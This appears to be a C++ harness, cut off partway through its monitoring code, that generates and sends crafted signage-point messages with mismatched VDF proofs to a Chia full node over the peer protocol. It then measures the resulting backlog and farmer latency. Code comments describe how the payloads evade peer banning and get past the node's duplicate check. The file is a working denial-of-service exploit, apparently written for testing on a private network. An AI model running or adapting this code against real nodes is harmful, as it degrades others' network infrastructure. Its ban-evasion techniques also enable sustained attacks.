// Native black-box behavior harness for Chia 2.7.3. No Chia imports.
#include <utility>
#include <boost/asio.hpp>
#include <boost/asio/ssl.hpp>
#include <boost/beast.hpp>
#include <boost/beast/ssl.hpp>
#include <boost/beast/websocket/ssl.hpp>
#include <nlohmann/json.hpp>
#include <openssl/sha.h>
#include <yaml-cpp/yaml.h>

#include <algorithm>
#include <chrono>
#include <cmath>
#include <cstdlib>
#include <cstdint>
#include <ctime>
#include <deque>
#include <filesystem>
#include <fstream>
#include <iomanip>
#include <iostream>
#include <map>
#include <optional>
#include <regex>
#include <set>
#include <sstream>
#include <stdexcept>
#include <string>
#include <thread>
#include <vector>
#include <sys/stat.h>

namespace net = boost::asio;
namespace ssl = net::ssl;
namespace beast = boost::beast;
namespace ws = beast::websocket;
namespace http = beast::http;
using tcp = net::ip::tcp;
using Json = nlohmann::json;
using Bytes = std::vector<unsigned char>;
using Clock = std::chrono::system_clock;
using Ns = std::chrono::nanoseconds;

namespace {
void require(bool ok, const std::string& message) {
    if (!ok) throw std::runtime_error(message);
}

struct Args {
    std::map<std::string, std::string> values;
    Args(int argc, char** argv) {
        for (int i = 2; i < argc; i += 2) {
            require(i + 1 < argc && std::string(argv[i]).starts_with("--"), "expected --option value");
            require(values.emplace(argv[i], argv[i + 1]).second, "duplicate option");
        }
    }
    std::string get(const std::string& key, const std::string& fallback = "") const {
        const auto it = values.find("--" + key);
        return it == values.end() ? fallback : it->second;
    }
    std::string need(const std::string& key) const {
        const auto value = get(key);
        require(!value.empty(), "missing --" + key);
        return value;
    }
    long long integer(const std::string& key, long long fallback = 0) const {
        const auto text = get(key, std::to_string(fallback));
        std::size_t end = 0;
        const auto value = std::stoll(text, &end);
        require(end == text.size(), "invalid integer --" + key);
        return value;
    }
    double number(const std::string& key, double fallback) const {
        const auto text = get(key, std::to_string(fallback));
        std::size_t end = 0;
        const auto value = std::stod(text, &end);
        require(end == text.size() && std::isfinite(value), "invalid number --" + key);
        return value;
    }
};

std::int64_t nowNs() {
    return std::chrono::duration_cast<Ns>(Clock::now().time_since_epoch()).count();
}

void waitNs(std::int64_t target) {
    std::this_thread::sleep_until(Clock::time_point(Ns(target)));
}

Json load(const std::string& path) {
    std::ifstream input(path);
    require(bool(input), "cannot read " + path);
    Json value;
    input >> value;
    return value;
}

void save(const std::string& path, const Json& value) {
    const auto parent = std::filesystem::path(path).parent_path();
    if (!parent.empty()) std::filesystem::create_directories(parent);
    const auto temporary = path + ".tmp";
    std::ofstream output(temporary);
    output << value.dump(2) << '\n';
    output.close();
    require(bool(output), "cannot write " + path);
    std::filesystem::rename(temporary, path);
}

Bytes unhex(std::string text) {
    if (text.starts_with("0x")) text.erase(0, 2);
    require(text.size() % 2 == 0, "odd hex length");
    Bytes output;
    output.reserve(text.size() / 2);
    for (std::size_t i = 0; i < text.size(); i += 2) {
        const auto pair = text.substr(i, 2);
        require(pair.find_first_not_of("0123456789abcdefABCDEF") == std::string::npos, "invalid hex");
        output.push_back(static_cast<unsigned char>(std::stoul(pair, nullptr, 16)));
    }
    return output;
}

std::string hex(const Bytes& bytes) {
    static const char* digits = "0123456789abcdef";
    std::string output;
    output.reserve(bytes.size() * 2);
    for (const auto value : bytes) {
        output += digits[value >> 4];
        output += digits[value & 15];
    }
    return output;
}

Bytes hash(const Bytes& bytes) {
    Bytes output(SHA256_DIGEST_LENGTH);
    SHA256(bytes.data(), bytes.size(), output.data());
    return output;
}

void append(Bytes& target, const Bytes& value) {
    target.insert(target.end(), value.begin(), value.end());
}

void uintBe(Bytes& bytes, std::uint64_t value, int size) {
    for (int i = size - 1; i >= 0; --i) {
        bytes.push_back(static_cast<unsigned char>(value >> (i * 8)));
    }
}

void sized(Bytes& bytes, const Bytes& value) {
    uintBe(bytes, value.size(), 4);
    append(bytes, value);
}

void text(Bytes& bytes, const std::string& value) {
    sized(bytes, Bytes(value.begin(), value.end()));
}

Bytes fixed(const Json& value, std::size_t length) {
    auto bytes = unhex(value.get<std::string>());
    require(bytes.size() == length, "wrong streamable field size");
    return bytes;
}

Bytes info(const Json& value) {
    Bytes bytes = fixed(value.at("challenge"), 32);
    uintBe(bytes, value.at("number_of_iterations").get<std::uint64_t>(), 8);
    append(bytes, fixed(value.at("output").at("data"), 100));
    return bytes;
}

Bytes proof(const Json& value, bool forceNonNormalized = false) {
    const auto witness = unhex(value.at("witness").get<std::string>());
    const auto type = value.at("witness_type").get<unsigned>();
    require(type < 256 && !witness.empty(), "unsupported VDF proof shape");
    Bytes bytes;
    uintBe(bytes, type, 1);
    sized(bytes, witness);
    uintBe(bytes, forceNonNormalized ? 0 : value.at("normalized_to_identity").get<bool>(), 1);
    return bytes;
}

Bytes message(unsigned type, const Bytes& payload) {
    Bytes bytes;
    uintBe(bytes, type, 1);
    uintBe(bytes, 0, 1);
    sized(bytes, payload);
    return bytes;
}

struct Reader {
    const Bytes& bytes;
    std::size_t position = 0;
    std::uint64_t uintBe(int size) {
        require(position + size <= bytes.size(), "truncated streamable");
        std::uint64_t value = 0;
        for (int i = 0; i < size; ++i) value = (value << 8) | bytes[position++];
        return value;
    }
    std::string text() {
        const auto size = uintBe(4);
        require(size <= bytes.size() - position, "truncated streamable bytes");
        std::string value(bytes.begin() + position, bytes.begin() + position + size);
        position += size;
        return value;
    }
};

void addVdfOutput(const Json& vdf, std::vector<Json>& outputs, std::set<std::string>& seen) {
    if (vdf.is_null() || !vdf.contains("output") || vdf.at("output").is_null()) return;
    const auto encoded = fixed(vdf.at("output").at("data"), 100);
    const auto key = hex(encoded);
    if (seen.insert(key).second) outputs.push_back(vdf.at("output"));
}

void fixtures(const Args& args) {
    const auto source = load(args.need("blocks"));
    const auto& blocks = source.at("blocks");
    require(blocks.is_array() && blocks.size() >= 4, "not enough source blocks");
    const auto count = args.integer("attack-count");
    require(count > 0 && count <= 100000, "invalid fixture count");

    const auto& base = blocks.at(0);
    const auto& baseRcb = base.at("reward_chain_block");
    const auto& baseCc = baseRcb.at("challenge_chain_sp_vdf");
    const auto& baseRc = baseRcb.at("reward_chain_sp_vdf");
    const auto index = baseRcb.at("signage_point_index").get<unsigned>();
    require(index > 0 && index < 16, "invalid base signage-point index");

    std::vector<Json> outputs;
    std::vector<Json> proofs;
    std::set<std::string> seenOutputs;
    std::set<std::string> seenProofs;
    const auto baseOutput = hex(fixed(baseCc.at("output").at("data"), 100));

    for (const auto& block : blocks) {
        const auto& rcb = block.at("reward_chain_block");
        for (const auto* name : {"challenge_chain_sp_vdf", "reward_chain_sp_vdf",
                                 "challenge_chain_ip_vdf", "reward_chain_ip_vdf"}) {
            if (rcb.contains(name)) addVdfOutput(rcb.at(name), outputs, seenOutputs);
        }
        for (const auto* name : {"challenge_chain_sp_proof", "reward_chain_sp_proof"}) {
            if (!block.contains(name) || block.at(name).is_null()) continue;
            // Parsing the unchanged witness is deterministic in both builds. The
            // serialized flag is forced to segment mode so an invalid equation
            // is cached as future work instead of banning the traffic source.
            const auto encodedProof = proof(block.at(name), true);
            const auto proofKey = hex(encodedProof);
            if (seenProofs.insert(proofKey).second) proofs.push_back(block.at(name));
        }
    }

    outputs.erase(std::remove_if(outputs.begin(), outputs.end(), [&](const Json& output) {
        return hex(fixed(output.at("data"), 100)) == baseOutput;
    }), outputs.end());
    require(!outputs.empty() && !proofs.empty(), "no canonical donor material");
    require(static_cast<unsigned long long>(outputs.size()) * proofs.size() >= static_cast<unsigned long long>(count),
            "not enough unique output/proof combinations");

    Json document = {
        {"format", 3},
        {"base_height", args.integer("base-height")},
        {"context_hash", hex(unhex(args.need("context-hash")))},
        {"signage_point_index", index},
        {"source_blocks", blocks.size()},
        {"donor_outputs", outputs.size()},
        {"donor_proofs", proofs.size()},
        {"attack", Json::array()},
    };
    require(unhex(args.need("context-hash")).size() == 32, "invalid context hash");

    std::set<std::string> payloadHashes;
    for (long long n = 0; n < count; ++n) {
        const auto outputIndex = static_cast<std::size_t>(n) % outputs.size();
        const auto proofIndex = (static_cast<std::size_t>(n) / outputs.size()) % proofs.size();
        auto cc = baseCc;
        auto rc = baseRc;
        cc["output"] = outputs.at(outputIndex);

        // Every rejected candidate needs a distinct RC challenge. The store's
        // future-SP duplicate guard keys on the RC VDF, so reusing the base RC
        // object would make all messages after the first skip verification.
        Bytes rcChallengeSeed{'l', 'o', 'c', 'k', '-', 'a', 'b', '-', 'r', 'c'};
        uintBe(rcChallengeSeed, static_cast<std::uint64_t>(n), 8);
        rc["challenge"] = hex(hash(rcChallengeSeed));

        Bytes payload;
        uintBe(payload, index, 1);
        append(payload, info(cc));
        append(payload, proof(proofs.at(proofIndex), true));
        append(payload, info(rc));
        append(payload, proof(base.at("reward_chain_sp_proof")));
        const auto digest = hex(hash(payload));
        require(payloadHashes.insert(digest).second, "duplicate fixture payload");
        document["attack"].push_back({{"payload", hex(payload)}, {"sha256", digest}});
    }

    const auto canonical = document.dump();
    document["fixture_sha256"] = hex(hash(Bytes(canonical.begin(), canonical.end())));
    save(args.need("output"), document);
}

int configure(YAML::Node node, bool check) {
    int found = 0;
    if (node.IsMap()) {
        auto constants = node["constants"];
        if (constants && constants.IsMap() && constants["private200"] && constants["private200"].IsMap()) {
            auto values = constants["private200"];
            for (const auto& [key, value] : std::map<std::string, int>{{"DIFFICULTY_CONSTANT_FACTOR", 1},
                    {"NUMBER_ZERO_BITS_PLOT_FILTER_V1", 0}, {"NUMBER_ZERO_BITS_PLOT_FILTER_V2", 0},
                    {"NUM_SPS_SUB_SLOT", 16}, {"SUB_SLOT_TIME_TARGET", 32}, {"SUB_SLOT_ITERS_STARTING", 4800000}}) {
                if (check) require(values[key] && values[key].as<int>() == value, "bootstrap constant mismatch: " + key);
                else values[key] = value;
            }
            if (check) require(!values["FORK_TIE_BREAK_HEIGHT"], "stale fork constant");
            else values.remove("FORK_TIE_BREAK_HEIGHT");
            ++found;
        }
        for (auto item : node) found += configure(item.second, check);
    } else if (node.IsSequence()) {
        for (auto child : node) found += configure(child, check);
    }
    return found;
}

void config(const Args& args) {
    const auto path = args.need("config");
    auto root = YAML::LoadFile(path);
    require(root["selected_network"].as<std::string>() == "private200", "selected_network must be private200");
    const bool check = args.get("mode") == "check";
    require(configure(root, check) > 0, "private200 constants missing");
    if (!check) {
        root["logging"]["log_level"] = "DEBUG";
        root["logging"]["log_maxbytesrotation"] = 200000000;
    } else {
        require(root["logging"]["log_level"].as<std::string>() == "DEBUG", "root logging is not DEBUG");
        require(root["logging"]["log_maxbytesrotation"].as<long long>() >= 200000000,
                "log rotation size is too small for measurement windows");
    }
    for (const auto* name : {"full_node", "farmer", "harvester", "timelord", "timelord_launcher"}) {
        auto service = root[name];
        if (!service) continue;
        if (check) require(service["logging"]["log_level"].as<std::string>() == "DEBUG", "service logging is not DEBUG");
        else service["logging"] = YAML::Clone(root["logging"]);
    }
    if (!check) {
        YAML::Emitter output;
        output.SetIndent(2);
        output << root;
        require(output.good(), "cannot emit config");
        std::ofstream stream(path + ".tmp");
        stream << output.c_str() << '\n';
        stream.close();
        require(bool(stream), "cannot write config");
        std::filesystem::rename(path + ".tmp", path);
    }
}

std::string rootPath(const Args& args) {
    const auto* value = std::getenv("CHIA_ROOT");
    return args.get("root", value ? value : "/run/chia/root");
}

void tls(ssl::context& context, const YAML::Node& config, const std::string& root, bool rpcConnection) {
    auto certificate = rpcConnection ? config["daemon_ssl"] : config["full_node"]["ssl"];
    auto ca = rpcConnection ? config["private_ssl_ca"] : config["chia_ssl_ca"];
    const std::string prefix = rpcConnection ? "private_" : "public_";
    context.load_verify_file((std::filesystem::path(root) / ca["crt"].as<std::string>()).string());
    context.use_certificate_chain_file((std::filesystem::path(root) / certificate[prefix + "crt"].as<std::string>()).string());
    context.use_private_key_file((std::filesystem::path(root) / certificate[prefix + "key"].as<std::string>()).string(), ssl::context::pem);
    context.set_verify_mode(ssl::verify_peer);
}

Json rpc(const YAML::Node& config, const std::string& root, const std::string& endpoint, double timeout) {
    net::io_context io;
    ssl::context context(ssl::context::tls_client);
    tls(context, config, root, true);
    beast::ssl_stream<beast::tcp_stream> stream(io, context);
    net::steady_timer timer(io);
    std::exception_ptr error;
    Json result;
    timer.expires_after(std::chrono::milliseconds(static_cast<int>(timeout * 1000)));
    timer.async_wait([&](beast::error_code ec) {
        if (!ec) beast::get_lowest_layer(stream).socket().close(ec);
    });
    net::co_spawn(io, [&]() -> net::awaitable<void> {
        tcp::resolver resolver(co_await net::this_coro::executor);
        const auto host = config["self_hostname"].as<std::string>();
        auto addresses = co_await resolver.async_resolve(host, config["full_node"]["rpc_port"].as<std::string>(), net::use_awaitable);
        co_await beast::get_lowest_layer(stream).async_connect(addresses, net::use_awaitable);
        co_await stream.async_handshake(ssl::stream_base::client, net::use_awaitable);
        http::request<http::string_body> request(http::verb::post, "/" + endpoint, 11);
        request.set(http::field::host, host);
        request.set(http::field::content_type, "application/json");
        request.body() = "{}";
        request.prepare_payload();
        co_await http::async_write(stream, request, net::use_awaitable);
        beast::flat_buffer buffer;
        http::response<http::string_body> response;
        co_await http::async_read(stream, buffer, response, net::use_awaitable);
        require(response.result_int() == 200, "RPC HTTP error");
        result = Json::parse(response.body());
        require(result.value("success", false), "RPC unsuccessful");
    }, [&](std::exception_ptr exception) {
        error = exception;
        timer.cancel();
    });
    io.run();
    if (error) std::rethrow_exception(error);
    return result;
}

void sendSet(const Args& args) {
    const auto document = load(args.need("fixtures"));
    const auto set = args.need("fixture-set");
    require(set == "attack", "invalid fixture set");
    const auto shard = args.integer("shard-index");
    const auto shards = args.integer("shard-count", 1);
    const auto limit = args.integer("limit", 100000);
    require(shards > 0 && shard >= 0 && shard < shards && limit > 0, "invalid shard/limit");

    std::vector<Bytes> payloads;
    for (std::size_t i = 0; i < document.at(set).size(); ++i) {
        if (i % shards != static_cast<std::size_t>(shard) || payloads.size() >= static_cast<std::size_t>(limit)) continue;
        const auto& entry = document.at(set).at(i);
        auto bytes = unhex(entry.at("payload"));
        require(hex(hash(bytes)) == entry.at("sha256").get<std::string>(), "fixture hash mismatch");
        payloads.push_back(message(37, bytes));
    }
    require(!payloads.empty(), "empty fixture selection");

    const auto start = args.integer("start-at-ns");
    const auto interval = static_cast<std::int64_t>(args.number("interval-ms", 200) * 1000000);
    const auto duration = args.number("duration", 0);
    const auto settle = args.number("settle-seconds", 1);
    const auto initialBurstSize = args.integer("initial-burst-size", 0);
    const auto burstSize = args.integer("burst-size", 0);
    const auto burstInterval = args.number("burst-interval-seconds", 0);
    const auto finalBurstSize = args.integer("final-burst-size", 0);
    const auto finalBurstLeadMs = args.number("final-burst-lead-ms", 0);
    const bool burstMode = initialBurstSize > 0 || burstSize > 0 || finalBurstSize > 0;
    require(start > 0 && interval >= 0 && duration >= 0 && settle >= 0,
            "invalid send timing");

    std::size_t regularBursts = 0;
    std::size_t expectedToSend = payloads.size();
    std::int64_t durationNs = static_cast<std::int64_t>(duration * 1e9);
    std::int64_t finalLeadNs = static_cast<std::int64_t>(finalBurstLeadMs * 1e6);
    std::int64_t burstIntervalNs = static_cast<std::int64_t>(burstInterval * 1e9);
    std::int64_t finalOffsetNs = 0;
    if (burstMode) {
        require(duration > 0 && initialBurstSize > 0 && burstSize > 0 &&
                    burstIntervalNs > 0 && finalBurstSize > 0,
                "burst mode requires duration and positive burst settings");
        require(finalLeadNs > 0 && finalLeadNs < durationNs,
                "final burst lead must fall inside send duration");
        finalOffsetNs = durationNs - finalLeadNs;
        regularBursts = static_cast<std::size_t>((finalOffsetNs - 1) / burstIntervalNs);
        expectedToSend = static_cast<std::size_t>(initialBurstSize) +
            regularBursts * static_cast<std::size_t>(burstSize) +
            static_cast<std::size_t>(finalBurstSize);
        require(expectedToSend <= payloads.size(), "fixture shard is smaller than burst schedule");
    }

    const auto root = rootPath(args);
    auto config = YAML::LoadFile(root + "/config/config.yaml");
    const auto network = config["selected_network"].as<std::string>();
    require(network == "private200", "not private200");

    net::io_context io;
    ssl::context context(ssl::context::tls_client);
    tls(context, config, root, false);
    ws::stream<beast::ssl_stream<beast::tcp_stream>> peer(io, context);
    net::steady_timer deadline(io);
    std::exception_ptr error;
    std::size_t sent = 0;
    bool closing = false;
    bool connected = false;
    bool timedOut = false;
    std::vector<std::string> warnings;

    const auto sendWindowNs = duration > 0 ? durationNs :
        interval * static_cast<std::int64_t>(payloads.size());
    deadline.expires_at(std::chrono::steady_clock::now() + std::chrono::seconds(30) +
        std::chrono::nanoseconds(std::max<std::int64_t>(0, start - nowNs())) +
        std::chrono::nanoseconds(sendWindowNs) +
        std::chrono::milliseconds(static_cast<int>(settle * 1000)));
    deadline.async_wait([&](beast::error_code ec) {
        if (!ec) {
            timedOut = true;
            error = std::make_exception_ptr(std::runtime_error("peer deadline exceeded"));
            io.stop();
        }
    });

    net::co_spawn(io, [&]() -> net::awaitable<void> {
        auto executor = co_await net::this_coro::executor;
        tcp::resolver resolver(executor);
        const auto host = args.get("target", "node01");
        const auto port = args.get("port", "8444");
        auto addresses = co_await resolver.async_resolve(host, port, net::use_awaitable);
        co_await beast::get_lowest_layer(peer).async_connect(addresses, net::use_awaitable);
        co_await peer.next_layer().async_handshake(ssl::stream_base::client, net::use_awaitable);
        peer.read_message_max(50 * 1024 * 1024);
        peer.binary(true);
        co_await peer.async_handshake(host + ":" + port, "/ws", net::use_awaitable);

        Bytes handshake;
        text(handshake, network);
        text(handshake, "0.0.36");
        text(handshake, "2.7.3");
        uintBe(handshake, 0, 2);
        uintBe(handshake, 1, 1);
        uintBe(handshake, 5, 4);
        for (const unsigned capability : {1, 2, 3, 5, 6}) {
            uintBe(handshake, capability, 2);
            text(handshake, "1");
        }
        auto outgoing = message(1, handshake);
        co_await peer.async_write(net::buffer(outgoing), net::use_awaitable);
        beast::flat_buffer buffer;
        co_await peer.async_read(buffer, net::use_awaitable);
        require(peer.got_binary(), "nonbinary Chia handshake");
        const auto raw = beast::buffers_to_string(buffer.data());
        Bytes reply(raw.begin(), raw.end());
        Reader reader{reply};
        require(reader.uintBe(1) == 1 && reader.uintBe(1) == 0, "invalid Chia handshake envelope");
        const auto length = reader.uintBe(4);
        require(length == reply.size() - reader.position, "invalid handshake length");
        require(reader.text() == network && reader.text() == "0.0.36", "peer network/protocol mismatch");
        reader.text();
        reader.uintBe(2);
        require(reader.uintBe(1) == 1, "peer is not full node");
        const auto capabilities = reader.uintBe(4);
        require(capabilities < 100, "invalid capabilities");
        bool baseCapability = false;
        for (std::size_t i = 0; i < capabilities; ++i) {
            const auto capability = reader.uintBe(2);
            const auto version = reader.text();
            if (capability == 1 && version == "1") baseCapability = true;
        }
        require(baseCapability && reader.position == reply.size(), "invalid peer capabilities");
        connected = true;

        net::co_spawn(io, [&]() -> net::awaitable<void> {
            for (;;) {
                beast::flat_buffer incoming;
                co_await peer.async_read(incoming, net::use_awaitable);
            }
        }, [&](std::exception_ptr exception) {
            if (exception && !closing) {
                error = exception;
                io.stop();
            }
        });

        if (nowNs() > start + 100000000) warnings.push_back("sender missed phase start");
        net::system_timer pace(executor);
        if (burstMode) {
            std::size_t payloadIndex = 0;
            pace.expires_at(Clock::time_point(Ns(start)));
            co_await pace.async_wait(net::use_awaitable);
            for (long long i = 0; i < initialBurstSize; ++i) {
                co_await peer.async_write(net::buffer(payloads[payloadIndex++]), net::use_awaitable);
                ++sent;
            }
            for (std::size_t burst = 1; burst <= regularBursts; ++burst) {
                const auto target = start + burstIntervalNs * static_cast<std::int64_t>(burst);
                pace.expires_at(Clock::time_point(Ns(target)));
                co_await pace.async_wait(net::use_awaitable);
                for (long long i = 0; i < burstSize; ++i) {
                    co_await peer.async_write(net::buffer(payloads[payloadIndex++]), net::use_awaitable);
                    ++sent;
                }
            }
            pace.expires_at(Clock::time_point(Ns(start + finalOffsetNs)));
            co_await pace.async_wait(net::use_awaitable);
            for (long long i = 0; i < finalBurstSize; ++i) {
                co_await peer.async_write(net::buffer(payloads[payloadIndex++]), net::use_awaitable);
                ++sent;
            }
        } else {
            for (std::size_t i = 0; i < payloads.size(); ++i) {
                const auto target = start + interval * static_cast<std::int64_t>(i);
                if (duration > 0 && target >= start + durationNs) break;
                pace.expires_at(Clock::time_point(Ns(target)));
                co_await pace.async_wait(net::use_awaitable);
                if (duration > 0 && nowNs() >= start + durationNs) break;
                co_await peer.async_write(net::buffer(payloads[i]), net::use_awaitable);
                ++sent;
            }
        }
        pace.expires_after(std::chrono::milliseconds(static_cast<int>(settle * 1000)));
        co_await pace.async_wait(net::use_awaitable);
        closing = true;
        co_await peer.async_close(ws::close_code::normal, net::use_awaitable);
    }, [&](std::exception_ptr exception) {
        if (exception) error = exception;
        io.stop();
    });

    io.run();
    if (error) {
        try {
            std::rethrow_exception(error);
        } catch (const boost::system::system_error& exception) {
            warnings.push_back(std::string("peer transport unavailable/interrupted: ") + exception.what());
        } catch (const std::exception& exception) {
            if (!connected && !timedOut) throw;
            warnings.push_back(std::string("peer traffic interrupted: ") + exception.what());
        }
    }
    if (sent == 0 || sent != expectedToSend) warnings.push_back("incomplete fixture send");
    const auto window = duration > 0 ? static_cast<std::int64_t>(duration * 1e9) :
        interval * static_cast<std::int64_t>(payloads.size() - 1);
    waitNs(start + window + static_cast<std::int64_t>(settle * 1e9));

    Json result = {
        {"fixture_set", set},
        {"connected", connected},
        {"timed_out", timedOut},
        {"sent", sent},
        {"available", payloads.size()},
        {"send_mode", burstMode ? "burst" : "paced"},
        {"initial_burst_size", initialBurstSize},
        {"regular_bursts", regularBursts},
        {"regular_burst_size", burstSize},
        {"final_burst_size", finalBurstSize},
        {"status", warnings.empty() ? "COMPLETE" : "WARNING"},
        {"warnings", warnings},
    };
    save(args.get("output", "/run/chia/lock-send-" + set + ".json"), result);
}

Json summarize(std::vector<double> values) {
    Json result = {{"count", values.size()}, {"p50_ms", nullptr}, {"p95_ms", nullptr},
                   {"p99_ms", nullptr}, {"max_ms", nullptr}};
    if (values.empty()) return result;
    std::sort(values.begin(), values.end());
    for (const auto& [key, percentile] : std::map<std::string, double>{{"p50_ms", .5}, {"p95_ms", .95}, {"p99_ms", .99}}) {
        const auto position = (values.size() - 1) * percentile;
        const auto low = static_cast<std::size_t>(position);
        const auto high = std::min(low + 1, values.size() - 1);
        const auto fraction = position - low;
        result[key] = values[low] * (1 - fraction) + values[high] * fraction;
    }
    result["max_ms"] = values.back();
    return result;
}

std::int64_t logTime(const std::string& line) {
    require(line.size() >= 23 && line[19] == '.', "missing log timestamp");
    std::tm value{};
    std::istringstream input(line.substr(0, 19));
    input >> std::get_time(&value, "%Y-%m-%dT%H:%M:%S");
    require(!input.fail() && line.substr(20, 3).find_first_not_of("0123456789") == std::string::npos,
            "invalid log timestamp");
    value.tm_isdst = -1;
    const auto seconds = std::mktime(&value);
    require(seconds != -1, "invalid log time");
    return seconds * 1000000000LL + std::stoi(line.substr(20, 3)) * 1000000LL;
}

Json scanLog(const std::string& path, std::int64_t start, std::int64_t end) {
    std::ifstream input(path);
    require(bool(input), "cannot open debug log");
    const std::regex declaration(R"(<- declare_proof_of_space from peer (?:0x)?([0-9a-fA-F]{64}) )");
    const std::regex signedValues(R"(-> request_signed_values to peer \S+ (?:0x)?([0-9a-fA-F]{64}))");

    std::map<std::string, std::deque<std::int64_t>> pending;
    std::vector<double> farmer;
    unsigned declared = 0;
    unsigned signedCount = 0;
    unsigned unmatched = 0;
    unsigned badTime = 0;
    unsigned incomingSignage = 0;
    unsigned signageResults = 0;
    unsigned invalidBans = 0;
    unsigned pendingSignage = 0;
    unsigned maximumPendingSignage = 0;
    unsigned unmatchedSignageResults = 0;
    std::int64_t firstIncomingSignage = 0;
    std::int64_t lastIncomingSignage = 0;
    std::int64_t firstSignageResult = 0;
    std::int64_t lastSignageResult = 0;
    std::int64_t last = 0;
    std::string line;

    while (std::getline(input, line)) {
        if (line.find(" full_node ") == std::string::npos) continue;
        const bool relevant = line.find("declare_proof_of_space from peer") != std::string::npos ||
            line.find("request_signed_values to peer") != std::string::npos ||
            line.find("respond_signage_point from peer") != std::string::npos ||
            line.find("Signage point ") != std::string::npos ||
            line.find("SP peer=") != std::string::npos ||
            line.find("invalid signage point VDF proof") != std::string::npos;
        if (!relevant) continue;

        std::int64_t timestamp;
        try {
            timestamp = logTime(line);
        } catch (...) {
            ++badTime;
            continue;
        }
        if (timestamp < start || timestamp >= end) continue;
        if (timestamp < last) ++badTime;
        last = timestamp;

        std::smatch match;
        if (std::regex_search(line, match, declaration)) {
            ++declared;
            pending[match[1]].push_back(timestamp);
        } else if (std::regex_search(line, match, signedValues)) {
            ++signedCount;
            auto found = pending.find(match[1]);
            if (found != pending.end() && !found->second.empty() && timestamp >= found->second.front()) {
                farmer.push_back((timestamp - found->second.front()) / 1e6);
                found->second.pop_front();
            } else {
                ++unmatched;
            }
        }
        if (line.find("<- respond_signage_point from peer") != std::string::npos) {
            ++incomingSignage;
            ++pendingSignage;
            maximumPendingSignage = std::max(maximumPendingSignage, pendingSignage);
            if (firstIncomingSignage == 0) firstIncomingSignage = timestamp;
            lastIncomingSignage = timestamp;
        }
        if ((line.find("Signage point ") != std::string::npos && line.find("not added") != std::string::npos) ||
            line.find("SP peer=") != std::string::npos) {
            ++signageResults;
            if (pendingSignage > 0) --pendingSignage;
            else ++unmatchedSignageResults;
            if (firstSignageResult == 0) firstSignageResult = timestamp;
            lastSignageResult = timestamp;
        }
        if (line.find("Banning ") != std::string::npos && line.find("invalid signage point VDF proof") != std::string::npos) ++invalidBans;
    }

    unsigned pendingCount = 0;
    for (const auto& [peer, queue] : pending) {
        (void)peer;
        pendingCount += queue.size();
    }
    Json backlog = {
        {"maximum_pending", maximumPendingSignage},
        {"pending_at_phase_end", pendingSignage},
        {"unmatched_results", unmatchedSignageResults},
        {"first_incoming_ns", firstIncomingSignage == 0 ? Json(nullptr) : Json(firstIncomingSignage)},
        {"last_incoming_ns", lastIncomingSignage == 0 ? Json(nullptr) : Json(lastIncomingSignage)},
        {"first_result_ns", firstSignageResult == 0 ? Json(nullptr) : Json(firstSignageResult)},
        {"last_result_ns", lastSignageResult == 0 ? Json(nullptr) : Json(lastSignageResult)},
        {"drain_after_last_input_ms", nullptr},
    };
    if (lastIncomingSignage > 0 && lastSignageResult >= lastIncomingSignage) {
        backlog["drain_after_last_input_ms"] = (lastSignageResult - lastIncomingSignage) / 1e6;
    }
    return {
        {"farmer", summarize(farmer)},
        {"farmer_samples_ms", farmer},
        {"declare_count", declared},
        {"request_signed_values_count", signedCount},
        {"pending_declarations", pendingCount},
        {"unmatched_signed_values", unmatched},
        {"timestamp_errors", badTime},
        {"incoming_signage_points", incomingSignage},
        {"signage_results", signageResults},
        {"signage_backlog", backlog},
        {"invalid_vdf_bans", invalidBans},
    };
}

void monitor(const Args& args) {
    const auto start = args.integer("start-at-ns");
    const auto duration = args.number("duration", 0);
    const auto end = start + static_cast<std::int64_t>(duration * 1e9);
    const auto pressureDuration = args.number("pressure-window-seconds", 0);
    const auto pressureEnd = pressureDuration > 0 ?
        std::min(end, start + static_cast<std::int64_t>(pressureDuration * 1e9)) : start;
    require(start > 0 && duration > 0, "invalid monitor interval");
    require(pressureDuration >= 0 && pressureDuration <= duration, "invalid pressure window");
    if (args.get("mode") == "log-only") {
        auto result = scanLog(args.need("log"), start, end);
        result["duration_seconds"] = duration;
        save(args.need("output"), result);
        return;
    }

    const auto startLateMs = std::max<std::int64_t>(0, nowNs() - start) / 1e6;
    struct stat before{}, after{};
    require(stat(args.need("log").c_str(), &before) == 0, "log missing");
    const auto root = rootPath(args);
    auto config = YAML::LoadFile(root + "/config/config.yaml");
    const auto timeout = args.number("probe-timeout", 2);
    const auto interval = args.number("probe-interval", .5);
    require(timeout > 0 && interval > 0, "invalid probe timing");
    const auto intervalNs = static_cast<std::int64_t>(interval * 1e9);

    std::vector<std::string> warnings;
    auto peak = [&]() -> Json {
        try {
            return rpc(config, root, "get_blockchain_state", timeout).at("blockchain_state").at("peak");
        } catch (const std::exception& exception) {
            warnings.push_back(std::string("peak RPC unavailable: ") + exception.what());
            return nullptr;
        }
    };

    waitNs(start);
    auto peakBefore = peak();
    std::vector<double> probes;
    std::vector<double> pressureProbes;
    unsigned failures = 0;
    unsigned skipped = 0;
    unsigned pressureFailures = 0;
    unsigned pressureSkipped = 0;
    auto scheduled = start;
    while (scheduled < end) {
        const auto current = nowNs();
        if (current < scheduled) waitNs(scheduled);
        const auto begunNs = nowNs();
        if (begunNs >= end) break;
        if (begunNs > scheduled + intervalNs) {
            const auto missed = static_cast<unsigned>((begunNs - scheduled) / intervalNs);
            skipped += missed;
            if (pressureDuration > 0) {
                for (unsigned i = 0; i < missed; ++i) {
                    if (scheduled + static_cast<std::int64_t>(i) * intervalNs < pressureEnd) {
                        ++pressureSkipped;
                    }
                }
            }
            scheduled += static_cast<std::int64_t>(missed) * intervalNs;
            if (scheduled >= end) break;
        }
        const auto begun = std::chrono::steady_clock::now();
        try {
            rpc(config, root, "healthz", timeout);
            const auto latency = std::chrono::duration<double, std::milli>(
                std::chrono::steady_clock::now() - begun).count();
            probes.push_back(latency);
            if (pressureDuration > 0 && begunNs < pressureEnd) pressureProbes.push_back(latency);
        } catch (...) {
            ++failures;
            if (pressureDuration > 0 && begunNs < pressureEnd) ++pressureFailures;
        }
        scheduled += intervalNs;
    }
    waitNs(end);
    auto peakAfter = peak();

    auto result = scanLog(args.need("log"), start, end);
    result["format"] = 3;
    result["phase"] = args.get("phase", "unspecified");
    result["start_at_ns"] = start;
    result["duration_seconds"] = duration;
    result["heartbeat"] = summarize(probes);
    result["heartbeat_failures"] = failures;
    result["heartbeat_skipped"] = skipped;
    result["heartbeat_scheduled"] = probes.size() + failures + skipped;
    result["heartbeat_samples_ms"] = probes;
    result["peak_before"] = peakBefore;
